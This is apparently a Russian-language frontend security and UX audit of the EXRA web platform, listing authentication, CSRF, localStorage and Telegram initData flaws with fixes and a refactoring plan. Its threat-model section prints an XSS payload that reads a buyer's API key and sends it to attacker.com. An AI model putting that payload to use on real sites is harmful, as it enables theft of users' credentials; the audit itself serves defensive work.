# 🔴 БЕЗЖАЛОСТНЫЙ АУДИТ АРХИТЕКТУРЫ ФРОНТЕНДА EXRA
## Senior UX/UI Architect & Security Lead Report

**Дата:** 21 апреля 2026  
**Статус:** КРИТИЧЕСКИЙ — 6 Sev-1 блокеров, 8 Sev-2 уязвимостей  
**Риск:** Утечка API-ключей покупателей, утечка админ-прав, размытие UX-границ

---

## 📋 EXECUTIVE SUMMARY

Текущая архитектура фронтенда — **"каша"** с критическими проблемами:

1. **Админ-панель видна без авторизации** (SSR + Client-side уязвимость)
2. **TMA = обрезанный маркетплейс** (размытие ролей)
3. **Landing не интегрирован** (UX-тупик)
4. **Design-Code Drift** (Syne/Instrument vs Inter, Lime vs Cyan)
5. **Утечка API-ключей** через TMA в маркетплейс
6. **Отсутствие Guard-проверок** на критических маршрутах

**Риск краски API-ключей:** 🔴 **ВЫСОКИЙ** — TMA может быть скомпрометирована, ключи утекут в маркетплейс.

---

## 🐛 BUG LIST (Критические косяки)

### 🔴 SEV-1: КРИТИЧЕСКИЕ УЯЗВИМОСТИ (Блокируют MVP)

#### **BUG-1: Admin Panel Accessible Without Auth (SSR + Client-side)**
- **Файл:** `dashboard/app/admin/page.tsx` (строки 63-316)
- **Проблема:**
  - `'use client'` — компонент рендерится на клиенте
  - Проверка сессии только в `useEffect` (строка 77-91)
  - **Уязвимость:** Между загрузкой страницы и выполнением `useEffect` админ-UI видна неавторизованному пользователю
  - Форма ввода `adminEmail` и `adminSecret` доступна всем (строки 224-235)
  - Нет SSR-редиректа — только client-side `router.push('/auth')`

- **Атака:**
  ```
  1. Неавторизованный пользователь открывает /admin
  2. Страница загружается, рендерится форма (useEffect еще не выполнен)
  3. Пользователь видит поля для ввода admin email/secret
  4. Если угадает/перехватит credentials → полный доступ к оракулам, выплатам, токеномике
  ```

- **Риск:** 🔴 **КРИТИЧЕСКИЙ** — утечка админ-прав, манипуляция выплатами, сжигание токенов

- **Fix:**
  ```typescript
  // Переместить в middleware.ts (SSR-уровень)
  export async function middleware(request: NextRequest) {
    if (request.nextUrl.pathname === '/admin') {
      const session = await getSession(request);
      if (!session || session.role !== 'admin') {
        return NextResponse.redirect(new URL('/auth', request.url));
      }
    }
  }
  ```

---

#### **BUG-2: Admin Link Visible in Marketplace Sidebar (Privilege Escalation)**
- **Файл:** `dashboard/app/marketplace/page.tsx` (строка 392-395)
- **Проблема:**
  ```tsx
  <Link className="nav-item" href="/admin">
    <ShieldCheck size={15} strokeWidth={1.8} />
    Admin Console
  </Link>
  ```
  - Ссылка на админ-консоль видна **всем пользователям маркетплейса**
  - Нет проверки роли перед рендером
  - Покупатель может кликнуть → попадет на /admin → увидит форму ввода credentials

- **Риск:** 🔴 **КРИТИЧЕСКИЙ** — социальная инженерия, brute-force админ-credentials

- **Fix:**
  ```tsx
  {user?.role === 'admin' && (
    <Link className="nav-item" href="/admin">
      <ShieldCheck size={15} strokeWidth={1.8} />
      Admin Console
    </Link>
  )}
  ```

---

#### **BUG-3: TMA Exposes Marketplace Features (Role Confusion)**
- **Файл:** `dashboard/app/tma/TMAApp.tsx` (весь компонент)
- **Проблема:**
  - TMA должна быть **чистым кабинетом воркера** (баланс, вывод, устройства)
  - Текущая реализация:
    - Показывает баланс в USD ✓ (правильно)
    - Показывает EXRA earned ✓ (правильно)
    - Показывает устройства ✓ (правильно)
    - **НО:** Нет явного разделения от маркетплейса
    - Используются те же компоненты (LavaHero, Sparkline)
    - Нет защиты от XSS-инъекций в device_id (строка 506)

- **Риск:** 🟡 **СРЕДНИЙ** — путаница в UX, потенциальная утечка данных воркера

- **Fix:** Создать отдельный `/apps/tma` с собственным дизайн-системом

---

#### **BUG-4: API Key Revealed in TMA (Buyer Secrets Leak)**
- **Файл:** `dashboard/app/marketplace/page.tsx` (строки 321-338)
- **Проблема:**
  - `revealBuyerApiKey()` вызывает `/buyer-api/auth/reveal` (GET запрос)
  - Ключ хранится в httpOnly cookie ✓ (хорошо)
  - **НО:** Если TMA скомпрометирована (XSS) → может вызвать reveal → утечка ключа
  - Нет rate-limiting на `/buyer-api/auth/reveal`
  - Нет проверки Referer/Origin

- **Риск:** 🔴 **КРИТИЧЕСКИЙ** — утечка API-ключей покупателей через TMA XSS

- **Fix:**
  ```typescript
  // В /buyer-api/auth/reveal
  if (req.headers.origin !== process.env.NEXT_PUBLIC_DASHBOARD_URL) {
    return NextResponse.json({ error: 'forbidden' }, { status: 403 });
  }
  // Rate limit: 1 reveal per 5 minutes per user
  ```

---

#### **BUG-5: No CSRF Protection on Mutable Endpoints**
- **Файл:** `dashboard/app/marketplace/page.tsx` (строки 238-259, 274-293, 295-308)
- **Проблема:**
  - `createOffer()`, `handleTopUp()`, `startSession()` — POST запросы без CSRF token
  - Используется `buyerFetch()` (строка 29-34) — просто fetch с httpOnly cookie
  - Если TMA загружена в iframe → может делать POST запросы от имени пользователя

- **Риск:** 🔴 **КРИТИЧЕСКИЙ** — CSRF атаки, несанкционированные выплаты

- **Fix:**
  ```typescript
  // Добавить CSRF token в middleware
  const csrfToken = await getCsrfToken();
  headers.set('X-CSRF-Token', csrfToken);
  ```

---

#### **BUG-6: TMA initData Not Validated Server-Side**
- **Файл:** `dashboard/app/tma/TMAApp.tsx` (строки 141-146, 164-171)
- **Проблема:**
  - `WebApp.initData` отправляется на сервер как-есть
  - Нет проверки TTL (Time To Live) — может быть старым
  - Нет проверки подписи Telegram
  - Если перехватить initData → можно выдать себя за другого пользователя

- **Риск:** 🔴 **КРИТИЧЕСКИЙ** — спуфинг Telegram ID, кража аккаунтов

- **Fix:**
  ```typescript
  // На сервере (/next-tma/auth)
  const isValid = validateTelegramInitData(initData, TMA_BOT_TOKEN);
  const age = Date.now() - initData.auth_date * 1000;
  if (age > 300000) { // 5 минут
    throw new Error('initData expired');
  }
  ```

---

### 🟡 SEV-2: ВЫСОКИЕ УЯЗВИМОСТИ (Закрывают фрод-векторы)

#### **BUG-7: No Guard on /marketplace Route**
- **Файл:** `dashboard/app/marketplace/page.tsx` (строка 89)
- **Проблема:**
  - Компонент `'use client'` — нет SSR-проверки
  - Неавторизованный пользователь может открыть /marketplace
  - Увидит все ноды, цены, но не сможет купить (нет buyer профиля)
  - **Утечка информации:** Цены, страны, типы устройств видны всем

- **Fix:**
  ```typescript
  // middleware.ts
  if (request.nextUrl.pathname === '/marketplace') {
    const session = await getSession(request);
    if (!session) {
      return NextResponse.redirect(new URL('/auth', request.url));
    }
  }
  ```

---

#### **BUG-8: Design-Code Drift (Font Chaos)**
- **Файл:** `dashboard/app/globals.css` vs `landing/app/globals.css`
- **Проблема:**
  - **Dashboard:** `Instrument Sans` (body), `Syne` (headings), `JetBrains Mono` (code)
  - **Landing:** `Geist` (body), `Geist Mono` (code) — через Tailwind
  - **TMA:** `Geist` (body), `Geist Mono` (code)
  - **Marketplace:** `Geist` (body), `Geist Mono` (code)
  - **Admin:** `Inter` (body) — полностью отличается!

- **Проблема:** Пользователь переходит между приложениями → шрифты скачут → ощущение "разных сайтов"

- **Fix:** Унифицировать на `Geist` + `Geist Mono` везде

---

#### **BUG-9: Color Palette Inconsistency**
- **Файл:** `dashboard/app/globals.css` vs `landing/app/globals.css`
- **Проблема:**
  - **Dashboard:** `--accent: #c8f03c` (Lime Green)
  - **Landing:** `--accent: #22d3ee` (Cyan) — через Tailwind
  - **TMA:** `--neon: #22d3ee` (Cyan)
  - **Marketplace:** `--neon: #22d3ee` (Cyan)

- **Проблема:** Админ-панель использует Lime, остальное — Cyan → визуальный диссонанс

- **Fix:** Все на Cyan (#22d3ee)

---

#### **BUG-10: Landing Not Integrated (UX Dead-End)**
- **Файл:** `landing/app/page.tsx` vs `dashboard/app/page.tsx`
- **Проблема:**
  - Landing (exra.space) — отдельный Next.js app
  - Dashboard (dashboard.exra.space) — отдельный Next.js app
  - **Нет навигации между ними:**
    - Landing → "Get Started" → ??? (куда?)
    - Dashboard → "Back to site" → / (редирект на /marketplace)
  - Пользователь не может вернуться на landing из маркетплейса

- **Fix:** Добавить в navbar:
  ```tsx
  <Link href="https://exra.space">← Back to landing</Link>
  ```

---

#### **BUG-11: No Rate Limiting on Admin Endpoints**
- **Файл:** `dashboard/app/admin/page.tsx` (строки 109-180)
- **Проблема:**
  - `verifyAndLoad()` делает 4 параллельных запроса без rate-limit
  - Нет защиты от brute-force админ-credentials
  - Нет логирования попыток входа

- **Fix:**
  ```typescript
  // На сервере
  const attempts = await redis.incr(`admin-attempts:${email}`);
  if (attempts > 5) {
    await redis.expire(`admin-attempts:${email}`, 900); // 15 минут
    return NextResponse.json({ error: 'too many attempts' }, { status: 429 });
  }
  ```

---

#### **BUG-12: localStorage Used for Admin Credentials**
- **Файл:** `dashboard/app/admin/page.tsx` (строки 85-88, 104-105)
- **Проблема:**
  ```typescript
  const rememberedEmail = localStorage.getItem('exra_admin_email') || '';
  const rememberedSecret = localStorage.getItem('exra_admin_secret') || '';
  localStorage.setItem('exra_admin_email', adminEmail);
  localStorage.setItem('exra_admin_secret', adminSecret);
  ```
  - **КРИТИЧНО:** Admin secret хранится в localStorage (JS-readable)
  - Любой XSS → утечка админ-credentials
  - Нет шифрования

- **Fix:**
  ```typescript
  // Использовать sessionStorage (очищается при закрытии браузера)
  // ИЛИ использовать httpOnly cookie
  ```

---

### 🟠 SEV-3: СРЕДНИЕ ПРОБЛЕМЫ (UX/Design)

#### **BUG-13: No Loading State on Admin Page**
- **Файл:** `dashboard/app/admin/page.tsx` (строка 208-210)
- **Проблема:**
  - Пока `sessionReady === false` → показывается "Loading..."
  - Но это может быть долго (Supabase запрос)
  - Нет feedback для пользователя

- **Fix:** Добавить skeleton loader

---

#### **BUG-14: Marketplace Sidebar Too Wide**
- **Файл:** `dashboard/app/marketplace/page.tsx` (строка 359)
- **Проблема:**
  - Sidebar = 220px (из globals.css)
  - На мобильных устройствах (TMA) это 40% экрана
  - Контент сжимается

- **Fix:** Responsive sidebar (120px на мобильных)

---

#### **BUG-15: No Logout Button**
- **Файл:** `dashboard/app/marketplace/page.tsx`
- **Проблема:**
  - Нет кнопки "Sign out"
  - Пользователь не может выйти из аккаунта
  - Только через Supabase dashboard

- **Fix:** Добавить logout в sidebar

---

---

## 🗺️ IDEAL USER JOURNEY MAP

### **Текущее состояние (BROKEN):**

```
Landing (exra.space)
    ↓
    ├─→ "Get Started" → ??? (DEAD END)
    └─→ "Sign in" → /auth (dashboard)
            ↓
        Auth Page
            ↓
        /marketplace (Buyer) OR /tma (Worker)
            ↓
            ├─ Marketplace: Browse nodes, buy traffic, manage API keys
            ├─ TMA: View balance, link devices, withdraw
            └─ Admin: ??? (видна всем, но требует credentials)
```

### **Идеальное состояние (FIXED):**

```
Landing (exra.space) ← ВИТРИНА
    ├─ Hero, Features, Tokenomics
    ├─ "I'm a Worker" → /tma (Telegram Mini App)
    ├─ "I'm a Buyer" → /auth → /marketplace
    └─ "I'm an Admin" → /admin (SSR-protected)

/tma (Telegram Mini App) ← КАБИНЕТ ВОРКЕРА
    ├─ Balance (USD + EXRA)
    ├─ My Devices
    ├─ Withdraw
    ├─ Link Device
    └─ Back to landing (exra.space)

/marketplace (Dashboard) ← КАБИНЕТ ПОКУПАТЕЛЯ
    ├─ Overview (Live map, stats)
    ├─ Browse Nodes
    ├─ Sessions
    ├─ Top Up
    ├─ Peaq Network (Staking)
    ├─ Developer Access (API keys)
    └─ Back to landing (exra.space)

/admin (Dashboard) ← АДМИН-КОНСОЛЬ (SSR-protected)
    ├─ Tokenomics
    ├─ Oracle Queue
    ├─ Payouts
    ├─ Incidents
    └─ Back to marketplace
```

---

## 🏗️ ПЛАН РЕФАКТОРИНГА АРХИТЕКТУРЫ

### **ФАЗА 1: Изоляция Админки (1 спринт)**

#### **1.1 Создать отдельный app для админки**
```
/apps/admin/
  ├─ app/
  │  ├─ layout.tsx (SSR-protected middleware)
  │  ├─ page.tsx (Admin dashboard)
  │  ├─ tokenomics/
  │  ├─ queue/
  │  ├─ payouts/
  │  └─ incidents/
  ├─ middleware.ts (JWT verification)
  ├─ lib/
  │  ├─ adminAuth.ts
  │  └─ adminApi.ts
  └─ package.json
```

#### **1.2 Реализовать SSR-уровень защиты**
```typescript
// /apps/admin/middleware.ts
export async function middleware(request: NextRequest) {
  const token = request.cookies.get('admin_jwt')?.value;
  
  if (!token) {
    return NextResponse.redirect(new URL('/login', request.url));
  }
  
  try {
    const decoded = verifyJWT(token, process.env.ADMIN_JWT_SECRET);
    if (decoded.role !== 'admin') {
      return NextResponse.redirect(new URL('/unauthorized', request.url));
    }
  } catch {
    return NextResponse.redirect(new URL('/login', request.url));
  }
}

export const config = {
  matcher: ['/admin/:path*'],
};
```

#### **1.3 Удалить админ-ссылку из маркетплейса**
```typescript
// /apps/dashboard/app/marketplace/page.tsx
// УДАЛИТЬ строки 392-395
```

---

### **ФАЗА 2: Разделение TMA (1 спринт)**

#### **2.1 Создать отдельный app для TMA**
```
/apps/tma/
  ├─ app/
  │  ├─ layout.tsx (TMA-specific)
  │  ├─ page.tsx (TMA entry)
  │  ├─ auth/
  │  ├─ devices/
  │  ├─ withdraw/
  │  └─ stats/
  ├─ components/
  │  ├─ TMAApp.tsx (переместить из dashboard)
  │  ├─ DeviceList.tsx
  │  ├─ WithdrawModal.tsx
  │  └─ tma.css (собственный дизайн)
  ├─ lib/
  │  ├─ tmaAuth.ts
  │  └─ tmaApi.ts
  └─ package.json
```

#### **2.2 Реализовать Telegram initData валидацию**
```typescript
// /apps/tma/lib/tmaAuth.ts
export function validateTelegramInitData(initData: string, botToken: string): boolean {
  const params = new URLSearchParams(initData);
  const hash = params.get('hash');
  
  // Проверить подпись
  const dataCheckString = Array.from(params.entries())
    .filter(([key]) => key !== 'hash')
    .sort(([a], [b]) => a.localeCompare(b))
    .map(([key, value]) => `${key}=${value}`)
    .join('\n');
  
  const secretKey = crypto.createHmac('sha256', 'WebAppData').update(botToken).digest();
  const computedHash = crypto.createHmac('sha256', secretKey).update(dataCheckString).digest('hex');
  
  return computedHash === hash;
}

export function validateInitDataAge(authDate: number, maxAge: number = 300): boolean {
  const age = Math.floor(Date.now() / 1000) - authDate;
  return age <= maxAge;
}
```

#### **2.3 Добавить CSRF protection**
```typescript
// /apps/tma/middleware.ts
export async function middleware(request: NextRequest) {
  if (request.method === 'POST') {
    const csrfToken = request.headers.get('x-csrf-token');
    const sessionCsrfToken = request.cookies.get('csrf_token')?.value;
    
    if (!csrfToken || csrfToken !== sessionCsrfToken) {
      return NextResponse.json({ error: 'csrf validation failed' }, { status: 403 });
    }
  }
}
```

---

### **ФАЗА 3: Унификация Дизайна (1 спринт)**

#### **3.1 Создать единую дизайн-систему**
```
/packages/design-system/
  ├─ tokens/
  │  ├─ colors.ts (Cyan #22d3ee, Lime #c8f03c → выбрать одно)
  │  ├─ typography.ts (Geist + Geist Mono везде)
  │  └─ spacing.ts
  ├─ components/
  │  ├─ Button.tsx
  │  ├─ Card.tsx
  │  ├─ Modal.tsx
  │  └─ ...
  ├─ styles/
  │  ├─ globals.css (единый)
  │  └─ tailwind.config.ts
  └─ package.json
```

#### **3.2 Унифицировать шрифты**
```css
/* /packages/design-system/styles/globals.css */
@import url('https://fonts.googleapis.com/css2?family=Geist:wght@400;500;600;700&family=Geist+Mono:wght@400;500&display=swap');

:root {
  --font-sans: 'Geist', system-ui, sans-serif;
  --font-mono: 'Geist Mono', monospace;
  --accent: #22d3ee; /* Cyan */
  --accent-alt: #c8f03c; /* Lime — только для акцентов */
}

body {
  font-family: var(--font-sans);
}

code, pre {
  font-family: var(--font-mono);
}
```

#### **3.3 Обновить все apps**
```typescript
// /apps/dashboard/app/globals.css
@import '@exra/design-system/styles/globals.css';

// /apps/tma/app/globals.css
@import '@exra/design-system/styles/globals.css';

// /apps/marketplace/app/globals.css
@import '@exra/design-system/styles/globals.css';
```

---

### **ФАЗА 4: Интеграция Landing (1 спринт)**

#### **4.1 Добавить навигацию**
```typescript
// /apps/landing/components/navbar.tsx
export function Navbar() {
  return (
    <nav>
      <Link href="/">EXRA</Link>
      <div className="nav-links">
        <Link href="#features">Features</Link>
        <Link href="#tokenomics">Tokenomics</Link>
        <Link href="https://dashboard.exra.space/marketplace">Marketplace</Link>
        <Link href="https://dashboard.exra.space/auth">Sign in</Link>
      </div>
    </nav>
  );
}
```

#### **4.2 Добавить CTA кнопки**
```typescript
// /apps/landing/components/hero.tsx
export function Hero() {
  return (
    <section>
      <h1>Decentralized bandwidth on demand</h1>
      <div className="cta-buttons">
        <Link href="https://t.me/exra_bot/app" className="btn-primary">
          I'm a Worker → Open TMA
        </Link>
        <Link href="https://dashboard.exra.space/auth" className="btn-secondary">
          I'm a Buyer → Sign in
        </Link>
      </div>
    </section>
  );
}
```

#### **4.3 Добавить "Back to landing" везде**
```typescript
// /apps/dashboard/components/navbar.tsx
<Link href="https://exra.space" className="nav-link">
  ← Back to landing
</Link>
```

---

### **ФАЗА 5: Security Hardening (2 спринта)**

#### **5.1 Реализовать CSRF protection везде**
```typescript
// /packages/lib/csrf.ts
export async function generateCsrfToken(): Promise<string> {
  return crypto.randomBytes(32).toString('hex');
}

export function validateCsrfToken(token: string, sessionToken: string): boolean {
  return crypto.timingSafeEqual(Buffer.from(token), Buffer.from(sessionToken));
}
```

#### **5.2 Добавить Rate Limiting**
```typescript
// /packages/lib/rateLimit.ts
export async function checkRateLimit(key: string, limit: number, window: number): Promise<boolean> {
  const count = await redis.incr(key);
  if (count === 1) {
    await redis.expire(key, window);
  }
  return count <= limit;
}
```

#### **5.3 Логирование всех действий**
```typescript
// /packages/lib/audit.ts
export async function logAction(userId: string, action: string, details: any) {
  await db.insert('audit_logs', {
    user_id: userId,
    action,
    details: JSON.stringify(details),
    timestamp: new Date(),
    ip: getClientIp(),
    user_agent: getUserAgent(),
  });
}
```

---

## 📊 RISK ASSESSMENT: API-КЛЮЧИ И TMA

### **Сценарий атаки: Утечка API-ключей покупателей через TMA**

```
1. Атакующий находит XSS в TMA (например, в device_id)
2. Инжектирует payload:
   <img src="x" onerror="
     fetch('/buyer-api/auth/reveal')
       .then(r => r.json())
       .then(d => fetch('https://attacker.com/steal?key=' + d.api_key))
   ">
3. Когда покупатель откроет TMA → XSS выполнится
4. API-ключ отправится на attacker.com
5. Атакующий использует ключ для:
   - Покупки трафика от имени покупателя
   - Слива баланса
   - Создания фейковых сессий
```

### **Текущие защиты:**
- ✓ httpOnly cookie (ключ не доступен JS)
- ✗ Нет Origin/Referer проверки на /buyer-api/auth/reveal
- ✗ Нет Rate Limiting
- ✗ Нет CSRF protection
- ✗ Нет логирования reveal операций

### **Риск:** 🔴 **ВЫСОКИЙ (8/10)**

### **Mitigation:**
1. Добавить Origin/Referer проверку
2. Rate limit: 1 reveal per 5 minutes
3. CSRF token на все POST запросы
4. Логировать все reveal операции
5. Отправлять email при reveal
6. Требовать re-auth для reveal (биометрия/2FA)

---

## 📋 CHECKLIST РЕФАКТОРИНГА

### **ФАЗА 1: Изоляция Админки**
- [ ] Создать `/apps/admin` структуру
- [ ] Реализовать SSR-уровень middleware
- [ ] Переместить admin компоненты
- [ ] Удалить админ-ссылку из маркетплейса
- [ ] Тестировать доступ без авторизации (должен редиректить)
- [ ] Добавить rate limiting на админ-endpoints

### **ФАЗА 2: Разделение TMA**
- [ ] Создать `/apps/tma` структуру
- [ ] Переместить TMAApp.tsx
- [ ] Реализовать Telegram initData валидацию
- [ ] Добавить TTL проверку (5 минут)
- [ ] Реализовать CSRF protection
- [ ] Тестировать с реальным Telegram Mini App

### **ФАЗА 3: Унификация Дизайна**
- [ ] Создать `/packages/design-system`
- [ ] Выбрать единый цвет (Cyan #22d3ee)
- [ ] Выбрать единый шрифт (Geist + Geist Mono)
- [ ] Обновить все apps
- [ ] Тестировать визуальную консистентность

### **ФАЗА 4: Интеграция Landing**
- [ ] Добавить навигацию в navbar
- [ ] Добавить CTA кнопки (Worker/Buyer)
- [ ] Добавить "Back to landing" везде
- [ ] Тестировать user journey

### **ФАЗА 5: Security Hardening**
- [ ] Реализовать CSRF protection везде
- [ ] Добавить Rate Limiting
- [ ] Реализовать Audit Logging
- [ ] Добавить Origin/Referer проверки
- [ ] Требовать re-auth для sensitive операций
- [ ] Тестировать security scenarios

---

## 🎯 PRIORITY MATRIX

| Приоритет | Задача | Спринт | Риск |
|-----------|--------|--------|------|
| 🔴 P0 | Защитить /admin от неавторизованного доступа | 1 | Sev-1 |
| 🔴 P0 | Удалить админ-ссылку из маркетплейса | 1 | Sev-1 |
| 🔴 P0 | Валидировать Telegram initData на сервере | 1 | Sev-1 |
| 🔴 P0 | Добавить Origin/Referer на /buyer-api/auth/reveal | 1 | Sev-1 |
| 🔴 P0 | Реализовать CSRF protection | 1 | Sev-1 |
| 🟡 P1 | Создать отдельный /apps/admin | 2 | Sev-2 |
| 🟡 P1 | Создать отдельный /apps/tma | 2 | Sev-2 |
| 🟡 P1 | Унифицировать дизайн (шрифты, цвета) | 2 | Sev-3 |
| 🟡 P1 | Интегрировать landing | 2 | Sev-3 |
| 🟢 P2 | Добавить logout кнопку | 3 | Sev-3 |
| 🟢 P2 | Добавить rate limiting на админ-endpoints | 3 | Sev-2 |

---

## 📝 ВЫВОДЫ

### **Текущее состояние:**
- ❌ Админ-панель видна без авторизации
- ❌ TMA = обрезанный маркетплейс
- ❌ Landing не интегрирован
- ❌ Design-Code Drift (шрифты, цвета)
- ❌ Утечка API-ключей через TMA XSS
- ❌ Отсутствие Guard-проверок

### **После рефакторинга:**
- ✅ Админ-панель защищена на SSR-уровне
- ✅ TMA = чистый кабинет воркера
- ✅ Landing интегрирован с навигацией
- ✅ Единая дизайн-система (Geist + Cyan)
- ✅ API-ключи защищены (Origin/Referer, CSRF, Rate Limit)
- ✅ Guard-проверки на всех критических маршрутах

### **Временная оценка:**
- **ФАЗА 1-2:** 2 спринта (10 дней)
- **ФАЗА 3-4:** 2 спринта (10 дней)
- **ФАЗА 5:** 2 спринта (10 дней)
- **Итого:** 6 спринтов (30 дней)

### **Риск неделания:**
- 🔴 Утечка админ-прав → манипуляция выплатами
- 🔴 Утечка API-ключей → слив баланса покупателей
- 🔴 Спуфинг Telegram ID → кража аккаунтов воркеров
- 🔴 CSRF атаки → несанкционированные операции

---

**Подготовлено:** Senior UX/UI Architect & Security Lead  
**Дата:** 21 апреля 2026  
**Статус:** ТРЕБУЕТ НЕМЕДЛЕННОГО ДЕЙСТВИЯ
